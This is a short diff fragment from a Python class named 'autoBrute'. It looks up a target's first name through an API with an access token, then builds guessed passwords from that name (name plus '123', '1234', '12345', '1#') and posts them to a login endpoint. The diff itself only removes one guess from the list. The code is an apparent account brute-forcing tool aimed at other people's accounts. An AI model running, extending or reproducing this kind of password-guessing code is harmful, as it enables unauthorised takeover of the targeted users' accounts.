@@ -91,7 +91,7 @@ class autoBrute:
 		self.user=requests.get(self.a.format(
 			target+"?access_token=%s"%(
 		self.token))).json()["first_name"] 
-		for x in [self.user+"123",self.user+"1234",self.user+"12345",self.user+"0",self.user+"1#"]: 
+		for x in [self.user+"123",self.user+"1234",self.user+"12345",self.user+"1#"]: 
 			r=requests.post(self.i.format("login"),
 				data=
 					{
